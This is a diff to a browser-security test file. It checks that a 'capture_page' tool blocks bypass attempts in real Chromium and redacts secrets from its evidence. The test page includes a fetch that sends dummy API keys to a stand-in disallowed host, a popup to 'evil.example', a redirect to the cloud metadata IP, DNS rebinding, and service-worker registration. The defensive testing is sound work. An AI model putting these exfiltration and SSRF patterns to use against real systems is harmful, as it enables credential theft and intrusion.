@@ -1,7 +1,7 @@
 // Issue #11: capture_page routes EVERY browser request through the replay policy. These tests drive real Chromium
 // against a page that tries each bypass and assert it was blocked and recorded (redacted) as evidence.
 import { createRequire } from "node:module";
-import { existsSync, mkdtempSync, readFileSync } from "node:fs";
+import { existsSync, mkdtempSync, readdirSync, readFileSync } from "node:fs";
 import http from "node:http";
 import type { AddressInfo } from "node:net";
 import { tmpdir } from "node:os";
@@ -14,7 +14,7 @@ const require = createRequire(import.meta.url);
 const hasChromium = (() => { try { return existsSync(require("playwright").chromium.executablePath()); } catch { return false; } })();
 if (process.env.REQUIRE_CHROMIUM && !hasChromium) throw new Error("REQUIRE_CHROMIUM is set but Chromium is not installed");
 
-const SECRETS = { q: "QUERYtok3n9911", key: "APIKEYsecret4477", pw: "USERpw8822", lf: "sk-lf-PATHtoken5566" };
+const SECRETS = { q: "QUERYtok3n9911", key: "APIKEYsecret4477", pw: "USERpw8822", lf: "sk-lf-PATHtoken5566", plain: "PLAINvalue7788" };
 const sandbox: Sandbox = { up: async () => ({ exitCode: 0, output: "" }), down: async () => ({ exitCode: 0, output: "" }), exec: async () => ({ exitCode: 0, output: "" }), logs: async () => "" };
 
 let srv: http.Server, port = 0;
@@ -31,10 +31,15 @@ beforeAll(async () => {
 <img src="/redir-meta">
 <img src="/ok.png">
 <script>
-fetch("http://not-allowed.example/api?api_key=${SECRETS.key}").catch(()=>{});
+fetch("http://not-allowed.example/api?api_key=${SECRETS.key}&page=${SECRETS.plain}").catch(()=>{});
 try { new WebSocket("ws://demo.local:${port}/ws"); } catch (e) {}
 setTimeout(() => window.open("http://evil.example/popup"), 10);
 </script>`);
+    if (req.url === "/sw-page") return html(`<h1>sw page</h1><p id="r">sw:pending</p><script>
+navigator.serviceWorker ? navigator.serviceWorker.register("/sw.js").then(() => { document.getElementById("r").textContent = "sw:REGISTERED"; }, (e) => { document.getElementById("r").textContent = "sw:rejected"; })
+  : (document.getElementById("r").textContent = "sw:unavailable");
+</script>`);
+    if (req.url === "/sw.js") { res.writeHead(200, { "content-type": "text/javascript" }); return res.end("self.addEventListener('fetch', () => {});"); }
     if (req.url === "/redir-meta") { res.writeHead(302, { location: "http://169.254.169.254/latest/meta-data/" }); return res.end(); }
     if (req.url === "/ok.png" || /^\/r\d|^\/r-xhr/.test(req.url ?? "")) { res.writeHead(200, { "content-type": "image/png" }); return res.end(Buffer.from("89504e470d0a1a0a", "hex")); }
     if (req.url === "/rebind") return html(`<h1>rebind</h1>${Array.from({ length: 5 }, (_, i) => `<img src="/r${i}.png">`).join("")}<script>fetch("/r-xhr").catch(()=>{})</script>`);
@@ -83,12 +88,13 @@ describe("capture_page blocks every bypass (real Chromium)", () => {
     expect(served.some((u) => /meta-data|userinfo|popup|\/ws/.test(u))).toBe(false);
     // redaction: no secret from any blocked URL lands in artifacts or the report
     const html = readFileSync(renderWalkthrough(core, id), "utf8");
-    const all = [readFileSync(join(core.dir(id), "commands.jsonl"), "utf8"), readFileSync(join(core.dir(id), "walkthrough.json"), "utf8"), JSON.stringify(doc), html].join("\n");
+    // every file under .walkthrough (state, command log, all evidence incl. HAR) + the report
+    const all = readdirSync(join(root, ".walkthrough"), { recursive: true, withFileTypes: true }).filter((d) => d.isFile()).map((d) => readFileSync(join(d.parentPath, d.name)).toString("latin1")).join("\n") + html;
+    for (const d of readdirSync(join(root, ".walkthrough"), { recursive: true, withFileTypes: true })) if (d.isFile()) { const t = readFileSync(join(d.parentPath, d.name)).toString("latin1"); for (const v of Object.values(SECRETS)) expect(t, `${d.name} leaks ${v}: ${t.slice(Math.max(0, t.indexOf(v) - 120), t.indexOf(v) + 20)}`).not.toContain(v); }
     for (const [k, v] of Object.entries(SECRETS)) expect(all, k).not.toContain(v);
     // count on the report's first screen + a table in the evidence
     expect(html).toMatch(new RegExp(`class="blocked-requests" data-blocked="${doc.count}">🛡 capture_page 已拦截 <b>${doc.count}</b> 个请求`));
     expect(html).toMatch(new RegExp(`class="blocked-table" data-ev="${blockedEv.id}" data-count="${doc.count}"`));
-    void root;
   }, 90_000);
 
   it.skipIf(!hasChromium)("DNS rebinding: host resolves to an allowed IP first and the metadata IP afterwards — the browser never reaches the second", async () => {
@@ -107,6 +113,22 @@ describe("capture_page blocks every bypass (real Chromium)", () => {
     const log = readFileSync(join(core.dir(id), "commands.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l)).at(-1);
     expect(log.subresources.every((s: { ip: string }) => s.ip === "127.0.0.1")).toBe(true);
     expect(log.navigations.every((s: { ip: string }) => s.ip === "127.0.0.1")).toBe(true);
+  }, 90_000);
+});
+
+describe("service workers", () => {
+  it.skipIf(!hasChromium)("a page cannot register a service worker during capture_page (serviceWorkers: 'block')", async () => {
+    // localhost is a secure context, so registration WOULD succeed without the block (checked by flipping it).
+    const { core } = mk(async () => "127.0.0.1", [`localhost:${port}`]);
+    const id = await planned(core);
+    const before = hits.length;
+    const evs = await core.capturePage(id, { checkId: "p", url: `http://localhost:${port}/sw-page` });
+    const text = readFileSync(join(core.dir(id), evs.find((e) => e.kind === "http")!.path), "utf8");
+    expect(text).toMatch(/sw:(rejected|unavailable)/);
+    expect(text).not.toContain("sw:REGISTERED");
+    expect(hits.slice(before)).not.toContain("/sw.js");
+    const b = evs.find((e) => e.kind === "blocked")!;
+    expect(JSON.parse(readFileSync(join(core.dir(id), b.path), "utf8")).blocked).toEqual(expect.arrayContaining([expect.objectContaining({ type: "serviceworker", url: expect.stringMatching(/\/sw\.js$/) })]));
   }, 90_000);
 });
 
